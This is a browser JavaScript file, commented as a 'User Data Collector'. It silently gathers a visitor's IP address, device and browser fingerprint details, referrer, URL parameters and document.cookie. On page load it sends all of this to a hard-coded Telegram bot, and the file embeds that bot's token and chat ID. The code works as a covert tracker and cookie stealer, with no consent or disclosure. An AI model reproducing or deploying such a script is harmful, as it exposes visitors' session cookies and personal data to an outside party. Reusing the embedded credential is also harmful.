// Set Dataset
let DataOnUser = [];


// Get IP Data
fetch("http://ip-api.com/line/?fields=query")
  .then((response) => {
    if (!response.ok) {
      return response.text().then(text => {
        throw new Error(`Network response was not ok: ${response.status} ${text}`);
      });
    }
    return response.text(); // Use .text() since the response is plain text
  })
  .then((data) => {
    if (!data) {
      throw new Error("No IP address returned");
    }
    DataOnUser.push("IP Data: " + data); // data is the IP address string
    console.log("IP Data: " + data); // Log the IP address
  })
  .catch((error) => {
    console.error("Error fetching data:", error);
  });

// Get the main language
let language = navigator.language;
DataOnUser.push("Language: " + language);

// Get preferred languages list
let languageList = navigator.languages;
DataOnUser.push("Preferred Languages List: " + languageList);

// Get operating system
let os = navigator.appVersion;
DataOnUser.push("Operating System: " + os);

// Get referrer
let referrer = document.referrer;
if (referrer == "") {
  referrer = "No Refferer";
}
DataOnUser.push("Reffering Website: " + referrer);

// Get time of visit
let time = new Date();
DataOnUser.push("Visit Time: " + time);

// Get screen resolution
let screenResolution = `${screen.width}x${screen.height}`;
DataOnUser.push("Screen Resolution: " + screenResolution);

// Get Cookies are enabled or not
let cookiesBool = navigator.cookieEnabled;
DataOnUser.push("Cookies Enabled?: " + cookiesBool);

// Get Cookies
let cookies = document.cookie;
if (cookies == "") {
  cookies = "No Cookies";
}
DataOnUser.push("Cookies: " + cookies);

// Get request method
let method = "GET";
DataOnUser.push("Method: " + method);

// Get request path
let path = window.location.pathname;
DataOnUser.push("Request Path: " + path);

// Get request parameters
let parameters = window.location.search;
if (parameters == "") {
  parameters = "No Parameters";
}
DataOnUser.push("Request Parameters: " + parameters);

// Get User Agent String (browser, system etc)
let userAgent = navigator.userAgent;
DataOnUser.push("User Agent: " + userAgent);

// Get device type (mobile/desktop)
let deviceType = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
DataOnUser.push("Device Type: " + deviceType);

// Get battery level
if (navigator.getBattery) {
  navigator.getBattery().then(function (battery) {
    let batteryLevel = battery.level * 100 + "%";
    DataOnUser.push("Battery Level: " + batteryLevel);
  });
} else if (navigator.battery) {
  let batteryLevel = navigator.battery.level * 100 + "%";
  DataOnUser.push("Battery Level: " + batteryLevel);
}

// Get device memory information
if (navigator.deviceMemory) {
  let memory = navigator.deviceMemory;
  DataOnUser.push("Device Memory: " + memory + "GB");
} else {
  DataOnUser.push(
    "Device Memory: " + "Memory information is not available in this browser."
  );
}

// Get timezone
let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
DataOnUser.push("Timezone: " + timezone);

// Get online/offline status (if connected to the network)
let onlineStatus = window.navigator.onLine ? "Online" : "Offline";
DataOnUser.push("Online Status: " + onlineStatus);
// User Data Collector



// Send collected data to Telegram
function sendToTelegram(data) {
    const token = "6864161221:AAG-QIHhP-ecZxcKsB_PaY9yaAlW7rRBw9M"; // Your bot token
    const chatId = "6107520820"; // Your chat ID
    const message = `User Data:\n\n${JSON.stringify(data, null, 2)}`; // Formatting for better readability

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Data sent successfully');
            } else {
                console.error('Error sending data: ' + data.description);
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

// Execute on page load
window.onload = function() {

    sendToTelegram(DataOnUser);
};

// Printing data
console.log(DataOnUser);
